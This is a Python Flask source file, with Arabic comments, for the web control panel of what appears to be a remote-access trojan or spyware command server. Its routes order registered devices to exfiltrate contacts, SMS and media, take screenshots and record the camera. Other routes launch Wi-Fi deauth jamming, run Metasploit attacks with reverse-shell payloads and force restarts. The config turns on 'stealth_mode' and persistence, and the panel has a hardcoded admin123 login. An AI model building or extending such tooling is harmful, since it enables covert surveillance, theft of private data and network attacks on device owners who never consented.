#!/usr/bin/env python3
"""
Fixed Web Dashboard - Complete Web Interface
Phase 3: Real Web Interface with Command Server Integration
"""

import json
import logging
import os
import time
import sqlite3
import requests
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash

# إعدادات النظام
SECURITY_CONFIG = {
    'enable_encryption': True,
    'enable_rate_limit': True,
    'enable_logging': True,
    'max_devices_per_user': 10,
    'session_timeout': 3600,
    'command_timeout': 30,
    'stealth_mode': True,
    'persistent_storage': True,
    'auto_reconnect': True
}

@dataclass
class DashboardConfig:
    """Dashboard configuration"""
    host: str = "0.0.0.0"
    port: int = 8081
    ssl_enabled: bool = False
    debug: bool = False
    max_connections: int = 100
    session_timeout: int = 3600

@dataclass
class DeviceInfo:
    """Device information"""
    device_id: str
    user_id: int
    device_name: str
    device_type: str
    os_info: str
    ip_address: str
    status: str
    last_seen: datetime
    capabilities: List[str]
    is_active: bool

class WebDeviceManager:
    """مدير الأجهزة لواجهة الويب"""
    
    def __init__(self, db_file: str = 'web_devices.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # جدول الأجهزة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS web_devices (
                device_id TEXT PRIMARY KEY,
                user_id INTEGER,
                device_name TEXT,
                device_type TEXT,
                os_info TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'inactive',
                last_seen TIMESTAMP,
                capabilities TEXT,
                is_active BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # جدول الأوامر
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS web_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command_type TEXT,
                parameters TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES web_devices (device_id)
            )
        ''')
        
        # جدول النشاطات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS web_activities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action TEXT,
                details TEXT,
                ip_address TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_device(self, device_id: str, user_id: int, device_info: Dict) -> bool:
        """إضافة جهاز جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO web_devices 
                (device_id, user_id, device_name, device_type, os_info, ip_address, status, last_seen, capabilities, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                device_id,
                user_id,
                device_info.get('name', 'Unknown Device'),
                device_info.get('type', 'mobile'),
                device_info.get('os', 'Unknown OS'),
                device_info.get('ip', 'Unknown IP'),
                'active',
                datetime.now(),
                json.dumps(device_info.get('capabilities', [])),
                1
            ))
            
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logging.error(f"خطأ في إضافة الجهاز: {e}")
            return False
    
    def get_user_devices(self, user_id: int) -> List[DeviceInfo]:
        """الحصول على أجهزة المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT * FROM web_devices WHERE user_id = ? ORDER BY last_seen DESC
            ''', (user_id,))
            
            devices = []
            for row in cursor.fetchall():
                device = DeviceInfo(
                    device_id=row[0],
                    user_id=row[1],
                    device_name=row[2],
                    device_type=row[3],
                    os_info=row[4],
                    ip_address=row[5],
                    status=row[6],
                    last_seen=datetime.fromisoformat(row[7]),
                    capabilities=json.loads(row[8]),
                    is_active=bool(row[9])
                )
                devices.append(device)
            
            conn.close()
            return devices
        except Exception as e:
            logging.error(f"خطأ في جلب الأجهزة: {e}")
            return []
    
    def update_device_status(self, device_id: str, status: str, device_info: str = None):
        """تحديث حالة الجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE web_devices 
                SET status = ?, last_seen = ?, is_active = ?
                WHERE device_id = ?
            ''', (status, datetime.now(), 1, device_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"خطأ في تحديث حالة الجهاز: {e}")
    
    def save_command(self, device_id: str, command_type: str, parameters: Dict = None) -> int:
        """حفظ أمر جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO web_commands (device_id, command_type, parameters)
                VALUES (?, ?, ?)
            ''', (device_id, command_type, json.dumps(parameters or {})))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return command_id
        except Exception as e:
            logging.error(f"خطأ في حفظ الأمر: {e}")
            return -1
    
    def update_command_result(self, command_id: int, status: str, result: str = None):
        """تحديث نتيجة الأمر"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE web_commands 
                SET status = ?, result = ?, executed_at = ?
                WHERE id = ?
            ''', (status, result, datetime.now(), command_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"خطأ في تحديث نتيجة الأمر: {e}")
    
    def log_activity(self, user_id: int, action: str, details: str = None):
        """تسجيل نشاط المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO web_activities (user_id, action, details, ip_address)
                VALUES (?, ?, ?, ?)
            ''', (user_id, action, details, request.remote_addr))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"خطأ في تسجيل النشاط: {e}")

class WebCommandExecutor:
    """منفذ الأوامر لواجهة الويب"""
    
    def __init__(self, command_server_url: str = "http://localhost:8080"):
        self.server_url = command_server_url
        self.is_connected = False
        self.logger = logging.getLogger(__name__)
    
    def check_connection(self) -> bool:
        """فحص الاتصال بالخادم"""
        try:
            response = requests.get(f'{self.server_url}/status', timeout=5)
            self.is_connected = response.status_code == 200
            if self.is_connected:
                self.logger.info("✅ الاتصال بالخادم نشط")
            else:
                self.logger.warning("⚠️ الخادم متصل ولكن غير مستجيب")
            return self.is_connected
        except requests.exceptions.ConnectionError:
            self.logger.error("❌ لا يمكن الاتصال بالخادم")
            self.is_connected = False
            return False
        except requests.exceptions.Timeout:
            self.logger.error("⏰ انتهت مهلة الاتصال بالخادم")
            self.is_connected = False
            return False
        except Exception as e:
            self.logger.error(f"❌ خطأ في فحص الاتصال: {e}")
            self.is_connected = False
            return False
    
    def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
        """إرسال أمر للجهاز عبر خادم الأوامر الحقيقي"""
        try:
            # فحص الاتصال أولاً
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}
            
            # إعداد البيانات للإرسال
            payload = {
                'client_id': device_id,
                'command': command,
                'parameters': parameters or {},
                'timestamp': time.time(),
                'user_id': 'web_dashboard'
            }
            
            # إرسال الأمر للخادم
            response = requests.post(
                f'{self.server_url}/command',
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=SECURITY_CONFIG['command_timeout']
            )
            
            if response.status_code == 200:
                result = response.json()
                self.logger.info(f"تم إرسال الأمر بنجاح: {command} للجهاز {device_id}")
                return result
            else:
                self.logger.error(f"خطأ في الخادم: {response.status_code} - {response.text}")
                return {'error': f'خطأ في الخادم: {response.status_code}'}
        
        except requests.exceptions.Timeout:
            self.logger.error(f"انتهت مهلة الاتصال للجهاز {device_id}")
            return {'error': 'انتهت مهلة الاتصال'}
        except requests.exceptions.RequestException as e:
            self.logger.error(f"خطأ في الاتصال: {str(e)}")
            return {'error': f'خطأ في الاتصال: {str(e)}'}
        except Exception as e:
            self.logger.error(f"خطأ غير متوقع: {str(e)}")
            return {'error': f'خطأ غير متوقع: {str(e)}'}
    
    def get_device_status(self, device_id: str) -> dict:
        """الحصول على حالة الجهاز من الخادم الحقيقي"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}
            
            response = requests.get(
                f'{self.server_url}/client-status/{device_id}',
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                self.logger.info(f"تم جلب حالة الجهاز: {device_id}")
                return result
            else:
                self.logger.error(f"خطأ في جلب حالة الجهاز: {response.status_code}")
                return {'error': f'خطأ في الخادم: {response.status_code}'}
        
        except requests.exceptions.RequestException as e:
            self.logger.error(f"خطأ في الاتصال لجلب حالة الجهاز: {str(e)}")
            return {'error': f'خطأ في الاتصال: {str(e)}'}
        except Exception as e:
            self.logger.error(f"خطأ غير متوقع في جلب حالة الجهاز: {str(e)}")
            return {'error': f'خطأ غير متوقع: {str(e)}'}
    
    def get_connected_devices(self) -> dict:
        """الحصول على قائمة الأجهزة المتصلة من الخادم الحقيقي"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}
            
            response = requests.get(
                f'{self.server_url}/clients',
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                self.logger.info(f"تم جلب {len(result.get('clients', []))} جهاز متصل")
                return result
            else:
                self.logger.error(f"خطأ في جلب الأجهزة المتصلة: {response.status_code}")
                return {'error': f'خطأ في الخادم: {response.status_code}'}
        
        except requests.exceptions.RequestException as e:
            self.logger.error(f"خطأ في الاتصال لجلب الأجهزة: {str(e)}")
            return {'error': f'خطأ في الاتصال: {str(e)}'}
        except Exception as e:
            self.logger.error(f"خطأ غير متوقع في جلب الأجهزة: {str(e)}")
            return {'error': f'خطأ غير متوقع: {str(e)}'}

class FixedWebDashboard:
    """لوحة التحكم المصلحة للويب"""
    
    def __init__(self, config: DashboardConfig):
        self.config = config
        self.logger = self._setup_logging()
        
        # تهيئة Flask
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'your-secret-key-here'
        self.app.config['SESSION_TYPE'] = 'filesystem'
        
        # تهيئة SocketIO
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        # تفعيل CORS
        CORS(self.app)
        
        # تهيئة المكونات
        self.device_manager = WebDeviceManager()
        self.command_executor = WebCommandExecutor()
        
        # إعداد المستخدمين
        self.users = {
            "admin": {
                "password_hash": generate_password_hash("admin123"),
                "role": "admin",
                "permissions": ["read", "write", "execute", "admin"]
            }
        }
        
        # الجلسات النشطة
        self.active_sessions = {}
        
        # إعداد المسارات
        self._setup_routes()
        self._setup_socket_events()
        
        self.logger.info("✅ تم تهيئة لوحة التحكم المصلحة")
    
    def _setup_logging(self) -> logging.Logger:
        """إعداد التسجيل"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('web_dashboard.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    def _setup_routes(self):
        """إعداد مسارات Flask"""
        
        @self.app.route('/')
        def index():
            """الصفحة الرئيسية"""
            if 'user_id' not in session:
                return redirect(url_for('login'))
            return render_template('dashboard.html')
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            """صفحة تسجيل الدخول"""
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                
                if self._authenticate_user(username, password):
                    session['user_id'] = username
                    session['role'] = self.users[username]['role']
                    self.device_manager.log_activity(1, 'login', f'User {username} logged in')
                    return redirect(url_for('index'))
                else:
                    return render_template('login.html', error="بيانات غير صحيحة")
            
            return render_template('login.html')
        
        @self.app.route('/logout')
        def logout():
            """تسجيل الخروج"""
            if 'user_id' in session:
                self.device_manager.log_activity(1, 'logout', f'User {session["user_id"]} logged out')
            session.clear()
            return redirect(url_for('login'))
        
        # API Routes - جميع الوظائف الحقيقية
        @self.app.route('/api/devices')
        def get_devices():
            """الحصول على الأجهزة"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            devices = self.device_manager.get_user_devices(1)
            return jsonify({
                "success": True,
                "devices": [asdict(device) for device in devices]
            })
        
        @self.app.route('/api/devices/<device_id>/status')
        def get_device_status(device_id):
            """الحصول على حالة الجهاز"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            status = self.command_executor.get_device_status(device_id)
            return jsonify(status)
        
        @self.app.route('/api/command', methods=['POST'])
        def execute_command():
            """تنفيذ أمر"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not device_id or not command:
                return jsonify({"error": "بيانات غير مكتملة"}), 400
            
            # حفظ الأمر
            command_id = self.device_manager.save_command(device_id, command, parameters)
            
            # تنفيذ الأمر
            result = self.command_executor.send_command(device_id, command, parameters)
            
            # تحديث النتيجة
            self.device_manager.update_command_result(command_id, 'completed', json.dumps(result))
            
            # تسجيل النشاط
            self.device_manager.log_activity(1, 'execute_command', f'Command: {command} on device: {device_id}')
            
            return jsonify(result)
        
        # Data Extraction APIs
        @self.app.route('/api/data/contacts', methods=['POST'])
        def extract_contacts():
            """استخراج جهات الاتصال"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            action = data.get('action', 'backup_all')
            
            result = self.command_executor.send_command(device_id, "data_exfiltration", {
                "type": "contacts",
                "action": action,
                "format": "json"
            })
            
            self.device_manager.log_activity(1, 'extract_contacts', f'Device: {device_id}, Action: {action}')
            
            return jsonify(result)
        
        @self.app.route('/api/data/sms', methods=['POST'])
        def extract_sms():
            """استخراج الرسائل"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            action = data.get('action', 'backup_all')
            
            result = self.command_executor.send_command(device_id, "data_exfiltration", {
                "type": "sms",
                "action": action,
                "format": "json"
            })
            
            self.device_manager.log_activity(1, 'extract_sms', f'Device: {device_id}, Action: {action}')
            
            return jsonify(result)
        
        @self.app.route('/api/data/media', methods=['POST'])
        def extract_media():
            """استخراج الوسائط"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            action = data.get('action', 'backup_photos')
            
            result = self.command_executor.send_command(device_id, "data_exfiltration", {
                "type": "media",
                "action": action,
                "format": "binary"
            })
            
            self.device_manager.log_activity(1, 'extract_media', f'Device: {device_id}, Action: {action}')
            
            return jsonify(result)
        
        # Surveillance APIs
        @self.app.route('/api/surveillance/screenshot', methods=['POST'])
        def take_screenshot():
            """التقاط لقطة شاشة"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            
            result = self.command_executor.send_command(device_id, "surveillance", {
                "action": "screenshot",
                "quality": "high",
                "format": "png"
            })
            
            self.device_manager.log_activity(1, 'take_screenshot', f'Device: {device_id}')
            
            return jsonify(result)
        
        @self.app.route('/api/surveillance/record', methods=['POST'])
        def record_camera():
            """تسجيل الكاميرا"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            duration = data.get('duration', 30)
            
            result = self.command_executor.send_command(device_id, "surveillance", {
                "action": "record_camera",
                "duration": duration,
                "quality": "high"
            })
            
            self.device_manager.log_activity(1, 'record_camera', f'Device: {device_id}, Duration: {duration}')
            
            return jsonify(result)
        
        # Attack APIs
        @self.app.route('/api/attacks/wifi', methods=['POST'])
        def wifi_attack():
            """هجوم الواي فاي"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            attack_type = data.get('attack_type', 'deauth')
            
            result = self.command_executor.send_command(device_id, "wifi_jamming", {
                "attack_type": attack_type,
                "target_ssid": data.get('target_ssid', 'all'),
                "duration": data.get('duration', 60)
            })
            
            self.device_manager.log_activity(1, 'wifi_attack', f'Device: {device_id}, Type: {attack_type}')
            
            return jsonify(result)
        
        @self.app.route('/api/attacks/mobile', methods=['POST'])
        def mobile_attack():
            """هجوم الأجهزة المحمولة"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            attack_type = data.get('attack_type', 'metasploit')
            
            result = self.command_executor.send_command(device_id, "mobile_attack", {
                "attack_type": attack_type,
                "target_os": data.get('target_os', 'android'),
                "payload_type": data.get('payload_type', 'reverse_shell')
            })
            
            self.device_manager.log_activity(1, 'mobile_attack', f'Device: {device_id}, Type: {attack_type}')
            
            return jsonify(result)
        
        # System Control APIs
        @self.app.route('/api/system/info', methods=['POST'])
        def get_system_info():
            """الحصول على معلومات النظام"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            
            result = self.command_executor.send_command(device_id, "system_control", {
                "action": "get_info",
                "include": ["os", "hardware", "network", "battery", "memory"]
            })
            
            self.device_manager.log_activity(1, 'get_system_info', f'Device: {device_id}')
            
            return jsonify(result)
        
        @self.app.route('/api/system/restart', methods=['POST'])
        def restart_system():
            """إعادة تشغيل النظام"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            
            result = self.command_executor.send_command(device_id, "system_control", {
                "action": "restart",
                "force": True
            })
            
            self.device_manager.log_activity(1, 'restart_system', f'Device: {device_id}')
            
            return jsonify(result)
        
        # Tools APIs
        @self.app.route('/api/tools/metasploit', methods=['POST'])
        def metasploit_tool():
            """أداة Metasploit"""
            if 'user_id' not in session:
                return jsonify({"error": "غير مصرح"}), 401
            
            data = request.get_json()
            device_id = data.get('device_id')
            action = data.get('action', 'start')
            
            result = self.command_executor.send_command(device_id, "tool_execution", {
                "tool": "metasploit",
                "action": action,
                "console": True
            })
            
            self.device_manager.log_activity(1, 'metasploit_tool', f'Device: {device_id}, Action: {action}')
            
            return jsonify(result)
    
    def _setup_socket_events(self):
        """إعداد أحداث SocketIO"""
        
        @self.socketio.on('connect')
        def handle_connect():
            """معالجة الاتصال"""
            self.logger.info(f"مستخدم متصل: {request.sid}")
            emit('connected', {'status': 'connected'})
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """معالجة قطع الاتصال"""
            self.logger.info(f"مستخدم منفصل: {request.sid}")
        
        @self.socketio.on('join_device_monitoring')
        def handle_join_device_monitoring(data):
            """الانضمام لمراقبة الجهاز"""
            device_id = data.get('device_id')
            if device_id:
                join_room(f'device_{device_id}')
                emit('joined_device_monitoring', {'device_id': device_id})
        
        @self.socketio.on('leave_device_monitoring')
        def handle_leave_device_monitoring(data):
            """مغادرة مراقبة الجهاز"""
            device_id = data.get('device_id')
            if device_id:
                leave_room(f'device_{device_id}')
                emit('left_device_monitoring', {'device_id': device_id})
    
    def _authenticate_user(self, username: str, password: str) -> bool:
        """مصادقة المستخدم"""
        if username in self.users:
            return check_password_hash(self.users[username]['password_hash'], password)
        return False
    
    def run(self):
        """تشغيل الخادم"""
        try:
            self.logger.info(f"🚀 بدء لوحة التحكم المصلحة على {self.config.host}:{self.config.port}")
            
            self.socketio.run(
                self.app,
                host=self.config.host,
                port=self.config.port,
                debug=self.config.debug
            )
        except Exception as e:
            self.logger.error(f"❌ خطأ في تشغيل الخادم: {e}")

def main():
    """الدالة الرئيسية"""
    config = DashboardConfig()
    dashboard = FixedWebDashboard(config)
    dashboard.run()

if __name__ == "__main__":
    main()